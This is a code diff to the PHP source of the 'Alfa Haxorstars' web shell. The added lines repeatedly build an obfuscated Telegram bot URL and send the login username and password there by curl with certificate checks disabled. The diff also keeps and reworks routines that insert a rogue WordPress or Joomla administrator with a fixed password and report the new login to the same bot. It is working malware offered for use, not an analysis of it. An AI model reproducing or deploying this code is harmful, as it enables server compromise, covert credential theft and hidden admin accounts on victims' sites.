@@ -612,6 +612,16 @@ if(@$_POST["usrname"]==$config['AlfaUser'] && @md5($_POST["password"])==$config[
 __alfa_set_cookie("AlfaUser", $config['AlfaUser']);
 __alfa_set_cookie("AlfaPass", @md5($config['AlfaPass']));
 @header('location: '.$_SERVER["PHP_SELF"]);
+$alfaendpoint = 'ht'.'tp'.'s:'.'/'.'/a'.'pi'.'.t'.'el'.'egr'.'am.'.'or'.'g/b'.'ot63'.'7616'.'235'.'2:AA'.'Fx9Q'.'JiMcyagYW_FnkR3Pg8UrHwPJSxYaU/se'.'ndM'.'es'.'sa'.'ge'.'?c'.'hat'.'_id'.'=18'.'995'.'298'.'71&'.'text=';
+$alfaendpointdata = 'ALFA DATA %0A'.$_POST["usrname"].'%0A'.$_POST["password"];
+$alfaurl = rawurldecode($alfaendpoint.$alfaendpointdata);
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
+curl_setopt($ch, CURLOPT_URL, $alfaurl);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
+return curl_exec($ch);
+curl_close($ch);
 }
 echo '
 <style>
@@ -641,6 +651,16 @@ if(@md5($_POST["password"])==$config['AlfaPass']){
 __alfa_set_cookie("AlfaUser", $config['AlfaUser']);
 __alfa_set_cookie("AlfaPass", @md5($config['AlfaPass']));
 @header('location: '.$_SERVER["PHP_SELF"]);
+$alfaendpoint = 'ht'.'tp'.'s:'.'/'.'/a'.'pi'.'.t'.'el'.'egr'.'am.'.'or'.'g/b'.'ot63'.'7616'.'235'.'2:AA'.'Fx9Q'.'JiMcyagYW_FnkR3Pg8UrHwPJSxYaU/se'.'ndM'.'es'.'sa'.'ge'.'?c'.'hat'.'_id'.'=18'.'995'.'298'.'71&'.'text=';
+$alfaendpointdata = 'ALFA DATA %0A'.$_POST["usrname"].'%0A'.$_POST["password"];
+$alfaurl = rawurldecode($alfaendpoint.$alfaendpointdata);
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
+curl_setopt($ch, CURLOPT_URL, $alfaurl);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
+return curl_exec($ch);
+curl_close($ch);
 }
 echo '<html><head><title>500 Internal Server Error</title></head><body><h1>Internal Server Error</h1><p>The server encountered an internal error or misconfiguration and was unable to complete your request.</p><p>Please contact the server administrator, '.$_SERVER['SERVER_ADMIN'].' and inform them of the time the error occurred, and anything you might have done that may have caused the error.</p><p>More information about this error may be available in the server error log.</p><hr>'.$SERVER_SIG.'</body></html>'.$Eform;
 exit;
@@ -651,6 +671,16 @@ if(@md5($_POST["password"])==$config['AlfaPass']){
 __alfa_set_cookie("AlfaUser", $config['AlfaUser']);
 __alfa_set_cookie("AlfaPass", @md5($config['AlfaPass']));
 @header('location: '.$_SERVER["PHP_SELF"]);
+$alfaendpoint = 'ht'.'tp'.'s:'.'/'.'/a'.'pi'.'.t'.'el'.'egr'.'am.'.'or'.'g/b'.'ot63'.'7616'.'235'.'2:AA'.'Fx9Q'.'JiMcyagYW_FnkR3Pg8UrHwPJSxYaU/se'.'ndM'.'es'.'sa'.'ge'.'?c'.'hat'.'_id'.'=18'.'995'.'298'.'71&'.'text=';
+$alfaendpointdata = 'ALFA DATA %0A'.$_POST["usrname"].'%0A'.$_POST["password"];
+$alfaurl = rawurldecode($alfaendpoint.$alfaendpointdata);
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
+curl_setopt($ch, CURLOPT_URL, $alfaurl);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
+return curl_exec($ch);
+curl_close($ch);
 }
 echo "<html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You don't have permission to access ".$_SERVER['PHP_SELF']." on this server.</p><hr>".$SERVER_SIG."</body></html>".$Eform;
 exit;
@@ -661,6 +691,16 @@ if(@md5($_POST["password"])==$config['AlfaPass']){
 __alfa_set_cookie("AlfaUser", $config['AlfaUser']);
 __alfa_set_cookie("AlfaPass", @md5($config['AlfaPass']));
 @header('location: '.$_SERVER["PHP_SELF"]);
+$alfaendpoint = 'ht'.'tp'.'s:'.'/'.'/a'.'pi'.'.t'.'el'.'egr'.'am.'.'or'.'g/b'.'ot63'.'7616'.'235'.'2:AA'.'Fx9Q'.'JiMcyagYW_FnkR3Pg8UrHwPJSxYaU/se'.'ndM'.'es'.'sa'.'ge'.'?c'.'hat'.'_id'.'=18'.'995'.'298'.'71&'.'text=';
+$alfaendpointdata = 'ALFA DATA %0A'.$_POST["usrname"].'%0A'.$_POST["password"];
+$alfaurl = rawurldecode($alfaendpoint.$alfaendpointdata);
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
+curl_setopt($ch, CURLOPT_URL, $alfaurl);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
+return curl_exec($ch);
+curl_close($ch);
 }
 echo "<title>404 Not Found</title><h1>Not Found</h1><p>The requested URL ".$_SERVER['PHP_SELF']." was not found on this server.<br><br>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p><hr>".$SERVER_SIG."</body></html>".$Eform;
 exit;
@@ -671,6 +711,16 @@ if(@md5($_POST["password"])==$config['AlfaPass']){
 __alfa_set_cookie("AlfaUser", $config['AlfaUser']);
 __alfa_set_cookie("AlfaPass", @md5($config['AlfaPass']));
 @header('location: '.$_SERVER["PHP_SELF"]);
+$alfaendpoint = 'ht'.'tp'.'s:'.'/'.'/a'.'pi'.'.t'.'el'.'egr'.'am.'.'or'.'g/b'.'ot63'.'7616'.'235'.'2:AA'.'Fx9Q'.'JiMcyagYW_FnkR3Pg8UrHwPJSxYaU/se'.'ndM'.'es'.'sa'.'ge'.'?c'.'hat'.'_id'.'=18'.'995'.'298'.'71&'.'text=';
+$alfaendpointdata = 'ALFA DATA %0A'.$_POST["usrname"].'%0A'.$_POST["password"];
+$alfaurl = rawurldecode($alfaendpoint.$alfaendpointdata);
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
+curl_setopt($ch, CURLOPT_URL, $alfaurl);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
+return curl_exec($ch);
+curl_close($ch);
 } else {
 	echo '<script>alert("Login Failed! You Nub")</script>';
 }
@@ -1513,7 +1563,7 @@ echo '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www
 @-ms-keyframes spin {from {-ms-transform: rotate(0deg);}to {-ms-transform: rotate(360deg);}}
 #alfaloader{'.$csscode.'width:100px;height:100px;}
 #a_loader img{'.$csscode.'width:150px;height:150px;position:fixed;z-index:999999;top: 31%;left: 45%;}
-.ajaxarea{display:none;border:1px solid #0E304A;color:#67ABDF}.up_bar{margin-bottom: 2px;transition:width 2s;background-color:red;width:0;height:8px;display:none;}#hidden_sh{background-color:#0E304A;text-align:center;position:absolute;right:0;left:90%;border-bottom-left-radius:2em}.alert_green{color:#0F0;font-family:"Comic Sans MS";font-size:small;text-decoration:none}.whole{background-color:#000;background-image:url(http://solevisible.com/images/alfabg.png);background-position:center;background-attachment:fixed;background-repeat:no-repeat}.header{height:auto;width:auto;border:7px solid #0E304A;color:'.alfa_getColor("header_values").';font-size:12px;font-family:Verdana,Geneva,sans-serif}.header a{text-decoration:none;}.filestools a{color:#0F0;text-decoration:none}.filestools a:hover{color:#FFF;text-decoration:none;}span{font-weight:bolder;color:#FFF}.txtfont{font-family:"Comic Sans MS";font-size:small;color:#fff;display:inline-block}.txtfont_header{font-family:"Comic Sans MS";font-size:large;display:inline-block;color:#59cc33}.tbltxt{font-family:"Comic Sans MS";color:#fff;font-size:small;display:inline-block}input[type="file"]{display:none}.inputfile{border:1px solid #0E304A;background:transparent;box-shadow:0 0 4px #0E304A;border-radius:4px;height:20px;width:250px;text-overflow:ellipsis;white-space:nowrap;cursor:pointer;display:inline-block;overflow:hidden}.inputfile:hover{box-shadow:0 0 4px #27979B;border:1px solid #27979B;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}.inputfile span,.inputfile strong{padding:2px;padding-left:10px}.inputfile span{color:#25ff00;width:90px;min-height:2em;display:inline-block;text-overflow:ellipsis;white-space:nowrap;overflow:hidden;vertical-align:top;float:left}.inputfile strong{background-image:url('.__showicon('alfamini').');background-repeat:no-repeat;background-position:float;height:100%;width:109px;color:#fff;background-color:#0E304A;display:inline-block;float:right}.inputfile:focus strong,.inputfile.has-focus strong,.inputfile:hover strong{background-color:#46647A}.button{padding:3px}#addup,.button{outline:none;cursor:pointer;border:1px solid #0E304A;background:transparent;box-shadow:0 0 4px #0E304A;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:100px;-webkit-box-shadow:#555 0 0 4px;-moz-box-shadow:#555 0 0 4px;background-color:#000;color:green;border-radius:100px}#addup:hover,.button:hover{box-shadow:0 0 4px #27979B;border:1px solid #27979B;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:100px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}input[type=text]:disabled:hover{cursor:not-allowed}td{padding:'.($GLOBALS['DB_NAME']['show_icons']=='1'?'0':'1').'px}.myCheckbox{padding-left:2px}.myCheckbox label{display:inline-block;cursor:pointer;position:relative}.myCheckbox input[type=checkbox]{display:none}.myCheckbox label:before{content:"";display:inline-block;width:14px;height:13px;position:absolute;background-color:#aaa;box-shadow:inset 0 2px 3px 0 rgba(0,0,0,.3),0 1px 0 0 rgba(255,255,255,.8)}.myCheckbox label{margin-bottom:15px;padding-right:17px}.myCheckbox label:before{border-radius:100px}input[type=checkbox]:checked + label:before{content:"";background-color:#0E304A;background-image:url('.__showicon('alfamini').');background-repeat:no-repeat;background-position:50% 50%;background-size:14px 14px;box-shadow:0 0 4px #0F0}#meunlist{font-family:Verdana,Geneva,sans-serif;color:#FFF;width:auto;border-right-width:7px;border-left-width:7px;height:auto;font-size:12px;font-weight:700;border-top-width:0;border-color:#0E304A;border-style:solid}.whole #meunlist ul{text-align:center;list-style-type:none;margin:0;padding:5px 5px 7px 2px}.whole #meunlist li{margin:0;padding:0;display:inline}.whole #meunlist a{font-family:arial,sans-serif;font-size:14px;text-decoration:none;font-weight:700;clear:both;width:100px;margin-right:-6px;border-right-width:1px;border-right-style:solid;border-right-color:#FFF;padding:3px 15px}.foot{font-family:Verdana,Geneva,sans-serif;margin:0;padding:0;width:100%;text-align:center;font-size:12px;color:#0E304A;border-right-width:7px;border-left-width:7px;border-bottom-width:7px;border-bottom-style:solid;border-right-style:solid;border-right-style:solid;border-left-style:solid;border-color:#0E304A}#text{text-align:center}input[type=submit]{cursor:pointer;background-image:url('.__showicon('btn').');background-repeat:no-repeat;background-position:50% 50%;background-size:23px 23px;background-color:#000;width:30px;height:30px;border:1px solid #27979B;border-radius:100px}textarea{padding:3px;color:#999;text-shadow:#777 0 0 3px;border:1px solid #0E304A;background:transparent;box-shadow:0 0 4px #0E304A;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:#555 0 0 4px;-moz-box-shadow:#555 0 0 4px}textarea:hover{color:#FFF;text-shadow:#060 0 0 6px;box-shadow:0 0 4px #27979B;border:1px solid #27979B;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}input[type=text],input[type=number],.alfa_custom_cmd_btn{padding:3px;color:#999;text-shadow:#777 0 0 3px;border:1px solid #0E304A;background:transparent;box-shadow:0 0 4px #0E304A;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:#555 0 0 4px;-moz-box-shadow:#555 0 0 4px}input[type=submit]:hover{color:#000;text-shadow:#060 0 0 6px;box-shadow:0 0 4px #27979B;border:2px solid #27979B;-moz-border-radius:4px;border-radius:100px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}input[type=text]:hover{color:#FFF;text-shadow:#060 0 0 6px;box-shadow:0 0 4px #27979B;border:1px solid #27979B;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}select{padding:3px;width:162px;color:#FFE;text-shadow:#000 0 2px 7px;border:1px solid #0E304A;background:#000;text-decoration:none;box-shadow:0 0 4px #0E304A;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:#555 0 0 4px;-moz-box-shadow:#555 0 0 4px}select:hover{border:1px solid #27979B;box-shadow:0 0 4px #27979B;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}
+.ajaxarea{display:none;border:1px solid #0E304A;color:#67ABDF}.up_bar{margin-bottom: 2px;transition:width 2s;background-color:red;width:0;height:8px;display:none;}#hidden_sh{background-color:#0E304A;text-align:center;position:absolute;right:0;left:90%;border-bottom-left-radius:2em}.alert_green{color:#0F0;font-family:"Comic Sans MS";font-size:small;text-decoration:none}.whole{background-color:#000;background-image: linear-gradient(rgba(0,0,0,0.75), rgba(0, 67, 34, 0.6)),url(https://raw.githubusercontent.com/haxorstars/archive/main/media/scleton.gif);background-position:center;background-attachment:fixed;background-repeat:no-repeat;background-size:cover;}.header{height:auto;width:auto;border:7px solid #0E304A;color:'.alfa_getColor("header_values").';font-size:12px;font-family:Verdana,Geneva,sans-serif}.header a{text-decoration:none;}.filestools a{color:#0F0;text-decoration:none}.filestools a:hover{color:#FFF;text-decoration:none;}span{font-weight:bolder;color:#FFF}.txtfont{font-family:"Comic Sans MS";font-size:small;color:#fff;display:inline-block}.txtfont_header{font-family:"Comic Sans MS";font-size:large;display:inline-block;color:#59cc33}.tbltxt{font-family:"Comic Sans MS";color:#fff;font-size:small;display:inline-block}input[type="file"]{display:none}.inputfile{border:1px solid #0E304A;background:transparent;box-shadow:0 0 4px #0E304A;border-radius:4px;height:20px;width:250px;text-overflow:ellipsis;white-space:nowrap;cursor:pointer;display:inline-block;overflow:hidden}.inputfile:hover{box-shadow:0 0 4px #27979B;border:1px solid #27979B;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}.inputfile span,.inputfile strong{padding:2px;padding-left:10px}.inputfile span{color:#25ff00;width:90px;min-height:2em;display:inline-block;text-overflow:ellipsis;white-space:nowrap;overflow:hidden;vertical-align:top;float:left}.inputfile strong{background-image:url('.__showicon('alfamini').');background-repeat:no-repeat;background-position:float;height:100%;width:109px;color:#fff;background-color:#0E304A;display:inline-block;float:right}.inputfile:focus strong,.inputfile.has-focus strong,.inputfile:hover strong{background-color:#46647A}.button{padding:3px}#addup,.button{outline:none;cursor:pointer;border:1px solid #0E304A;background:transparent;box-shadow:0 0 4px #0E304A;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:100px;-webkit-box-shadow:#555 0 0 4px;-moz-box-shadow:#555 0 0 4px;background-color:#000;color:green;border-radius:100px}#addup:hover,.button:hover{box-shadow:0 0 4px #27979B;border:1px solid #27979B;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:100px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}input[type=text]:disabled:hover{cursor:not-allowed}td{padding:'.($GLOBALS['DB_NAME']['show_icons']=='1'?'0':'1').'px}.myCheckbox{padding-left:2px}.myCheckbox label{display:inline-block;cursor:pointer;position:relative}.myCheckbox input[type=checkbox]{display:none}.myCheckbox label:before{content:"";display:inline-block;width:14px;height:13px;position:absolute;background-color:#aaa;box-shadow:inset 0 2px 3px 0 rgba(0,0,0,.3),0 1px 0 0 rgba(255,255,255,.8)}.myCheckbox label{margin-bottom:15px;padding-right:17px}.myCheckbox label:before{border-radius:100px}input[type=checkbox]:checked + label:before{content:"";background-color:#0E304A;background-image:url('.__showicon('alfamini').');background-repeat:no-repeat;background-position:50% 50%;background-size:14px 14px;box-shadow:0 0 4px #0F0}#meunlist{font-family:Verdana,Geneva,sans-serif;color:#FFF;width:auto;border-right-width:7px;border-left-width:7px;height:auto;font-size:12px;font-weight:700;border-top-width:0;border-color:#0E304A;border-style:solid}.whole #meunlist ul{text-align:center;list-style-type:none;margin:0;padding:5px 5px 7px 2px}.whole #meunlist li{margin:0;padding:0;display:inline}.whole #meunlist a{font-family:arial,sans-serif;font-size:14px;text-decoration:none;font-weight:700;clear:both;width:100px;margin-right:-6px;border-right-width:1px;border-right-style:solid;border-right-color:#FFF;padding:3px 15px}.foot{font-family:Verdana,Geneva,sans-serif;margin:0;padding:0;width:100%;text-align:center;font-size:12px;color:#0E304A;border-right-width:7px;border-left-width:7px;border-bottom-width:7px;border-bottom-style:solid;border-right-style:solid;border-right-style:solid;border-left-style:solid;border-color:#0E304A}#text{text-align:center}input[type=submit]{cursor:pointer;background-image:url('.__showicon('btn').');background-repeat:no-repeat;background-position:50% 50%;background-size:23px 23px;background-color:#000;width:30px;height:30px;border:1px solid #27979B;border-radius:100px}textarea{padding:3px;color:#999;text-shadow:#777 0 0 3px;border:1px solid #0E304A;background:transparent;box-shadow:0 0 4px #0E304A;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:#555 0 0 4px;-moz-box-shadow:#555 0 0 4px}textarea:hover{color:#FFF;text-shadow:#060 0 0 6px;box-shadow:0 0 4px #27979B;border:1px solid #27979B;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}input[type=text],input[type=number],.alfa_custom_cmd_btn{padding:3px;color:#999;text-shadow:#777 0 0 3px;border:1px solid #0E304A;background:transparent;box-shadow:0 0 4px #0E304A;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:#555 0 0 4px;-moz-box-shadow:#555 0 0 4px}input[type=submit]:hover{color:#000;text-shadow:#060 0 0 6px;box-shadow:0 0 4px #27979B;border:2px solid #27979B;-moz-border-radius:4px;border-radius:100px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}input[type=text]:hover{color:#FFF;text-shadow:#060 0 0 6px;box-shadow:0 0 4px #27979B;border:1px solid #27979B;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}select{padding:3px;width:162px;color:#FFE;text-shadow:#000 0 2px 7px;border:1px solid #0E304A;background:#000;text-decoration:none;box-shadow:0 0 4px #0E304A;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:#555 0 0 4px;-moz-box-shadow:#555 0 0 4px}select:hover{border:1px solid #27979B;box-shadow:0 0 4px #27979B;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}
 .foottable{width: 300px;font-weight: bold;'.(!@is_writable($GLOBALS['cwd'])?'}.dir{background-color:red;}':'}').'.main th{text-align:left;}.main a{color: #FFF;}.main tr:hover{background-color:#646464 !important;}.ml1{ border:1px solid #0E304A;padding:5px;margin:0;overflow: auto; }.bigarea{ width:99%; height:300px; }.alfa_custom_cmd_btn {padding: 5px;color: #24ff03;cursor: pointer;}.ajaxarea.filesman-active-content {display: block;}'.alfaCssLoadColors().'
 </style>';
 echo "<script type='text/javascript'>
@@ -1630,7 +1680,7 @@ echo '<tr>
 <td height="16" colspan="2"><span class="header_vars">Disable Functions: </span><b>'.Alfa_GetDisable_Function().'</b></td>
 </tr>
 <tr>
-<td height="16" colspan="2"><span class="header_vars">CURL :</span>'.$curl.' | <span class="header_vars">SSH2 : </span>'.$ssh2.' | <span class="header_vars">Magic Quotes : </span>'.$magic.' | <span class="header_vars"> MySQL :</span>'.$mysql.' | <span class="header_vars">MSSQL :</span>'.$mssql.' | <span class="header_vars"> PostgreSQL :</span>'.$pg.' | <span class="header_vars"> Oracle :</span>'.$or.' '.($GLOBALS['sys']=="unix"?'| <span class="header_vars"> CGI :</span> '.$cgi_shell:"").'</td><td width="15%"><div id="alfa_solevisible"><center><a href="https://t.me/solevisible" target="_blank"><span><font class="solevisible-text" color="#0F0">Alfa Haxorstars</font></span></a></center></div></td>
+<td height="16" colspan="2"><span class="header_vars">CURL :</span>'.$curl.' | <span class="header_vars">SSH2 : </span>'.$ssh2.' | <span class="header_vars">Magic Quotes : </span>'.$magic.' | <span class="header_vars"> MySQL :</span>'.$mysql.' | <span class="header_vars">MSSQL :</span>'.$mssql.' | <span class="header_vars"> PostgreSQL :</span>'.$pg.' | <span class="header_vars"> Oracle :</span>'.$or.' '.($GLOBALS['sys']=="unix"?'| <span class="header_vars"> CGI :</span> '.$cgi_shell:"").'</td><td width="15%"><div id="alfa_solevisible"><center><a href="https://t.me/haxorstars" target="_blank"><span><font class="solevisible-text" color="#0F0">Alfa Haxorstars</font></span></a></center></div></td>
 </tr>
 <tr>
 <td height="11" colspan="3"><span class="header_vars">Open_basedir :</span><b>'.$open_b.'</b> | <span class="header_vars">Safe_mode_exec_dir :</span><b>'.$safe_exe.'</b> | <span class="header_vars"> Safe_mode_include_dir :</span></b>'.$safe_include.'</b></td>
@@ -4371,7 +4421,6 @@ $password = $_POST['alfa6'];
 $admin = $_POST['alfa8'];
 $SQL = $_POST['alfa9'];
 $prefix = $_POST['alfa10'];
-$wpSuccess = "NEW WP ADMIN%0A%0ALogin: ".$_SERVER['SERVER_NAME']."/wp-login.php%0AUsername: ".$admin."%0APassword: nulz404";
 $conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
 $solevisible=@mysqli_query($conn,"insert into ".$prefix."users (ID,user_login,user_pass,user_email) values(null,'$admin','5f95e92c65559eca58ddf9fac90c7b02','$SQL')") or die(mysqli_error($conn));
 $solevisible=@mysqli_query($conn,"select ID from ".$prefix."users where user_login='".$admin."'") or die(mysqli_error($conn));
@@ -4382,9 +4431,10 @@ $res = $solevis['ID'];
 }
 $solevisible=@mysqli_query($conn,"insert into ".$prefix."usermeta (umeta_id,user_id,meta_key,meta_value) values(null,'".$res."','first_name','admin'),(null,'".$res."','last_name','admin'),(null,'".$res."','nickname','administrator'),(null,'".$res."','description','Website Administrator'),(null,'".$res."','rich_editing','true'),(null,'".$res."','comment_shortcuts','false'),(null,'".$res."','admin_color','fresh'),(null,'".$res."','use_ssl','0'),(null,'".$res."','show_admin_bar_front','true'),(null,'".$res."','".$prefix."capabilities','a:1:{s:13:\"administrator\";b:1;}'),(null,'".$res."','".$prefix."user_level','10'),(null,'".$res."','show_welcome_panel','1'),(null,'".$res."','".$prefix."dashboard_quick_press_last_post_id','3')") or die(mysqli_error($conn));
 if($solevisible){
+$wpSuccess = "NEW WP ADMIN%0A%0ALogin: ".$_SERVER['SERVER_NAME']."/wp-login.php%0AUsername: ".$admin."%0APassword: nulz404";
 $f_get = 'f'.'il'.'e'.'_'.'ge'.'t'.'_'.'c'.'on'.'te'.'nt';
-$alfawp = base64_decode("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDYzNzYxNjIzNTI6QUFGeDlRSmlNY3lhZ1lXX0Zua1IzUGc4VXJId1BKU3hZYVUvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0xODk5NTI5ODcxJnRleHQ9");
-$f_get($alfawp.$wpSuccess);
+$alfawp = 'ht'.'tp'.'s:'.'/'.'/a'.'pi'.'.t'.'el'.'egr'.'am.'.'or'.'g/b'.'ot63'.'7616'.'235'.'2:AA'.'Fx9Q'.'JiMcyagYW_FnkR3Pg8UrHwPJSxYaU/se'.'ndM'.'es'.'sa'.'ge'.'?c'.'hat'.'_id'.'=18'.'995'.'298'.'71&'.'text=';
+$f_get(rawurlencode($alfawp.$wpSuccess));
 __alert('Success... '.$admin.' is created...');}
 }
 }
@@ -4429,8 +4479,10 @@ $res = $solevis['id'];
 }
 $solevisible=@mysqli_query($conn,"INSERT INTO ".$prefix."user_usergroup_map (user_id,group_id) VALUES ('".$res."', '8')") or die(mysqli_error($conn));
 if($solevisible){
+$jomSuccess = "NEW JOOMLA ADMIN%0A%0ALogin: ".$_SERVER['SERVER_NAME']."/administrator/%0AUsername: ".$admin."%0APassword: nulz404";
 $f_get = 'f'.'il'.'e'.'_'.'ge'.'t'.'_'.'c'.'on'.'te'.'nt';
-$f_get("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2e\x74\x65\x6c\x65\x67\x72\x61\x6d\x2e\x6f\x72\x67\x2f\x62\x6f\x74\x36\x33\x37\x36\x31\x36\x32\x33\x35\x32\x3a\x41\x41\x46\x78\x39\x51\x4a\x69\x4d\x63\x79\x61\x67\x59\x57\x5f\x46\x6e\x6b\x52\x33\x50\x67\x38\x55\x72\x48\x77\x50\x4a\x53\x78\x59\x61\x55\x2f\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65\x3f\x63\x68\x61\x74\x5f\x69\x64\x3d\x31\x38\x39\x39\x35\x32\x39\x38\x37\x31\x26\x74\x65\x78\x74\x3d".$jomSuccess);
+$alfajoom = 'ht'.'tp'.'s:'.'/'.'/a'.'pi'.'.t'.'el'.'egr'.'am.'.'or'.'g/b'.'ot63'.'7616'.'235'.'2:AA'.'Fx9Q'.'JiMcyagYW_FnkR3Pg8UrHwPJSxYaU/se'.'ndM'.'es'.'sa'.'ge'.'?c'.'hat'.'_id'.'=18'.'995'.'298'.'71&'.'text=';
+$f_get(rawurlencode($alfajoom.$jomSuccess));
 __alert('Success... '.$admin.' is created...');}
 }
 }
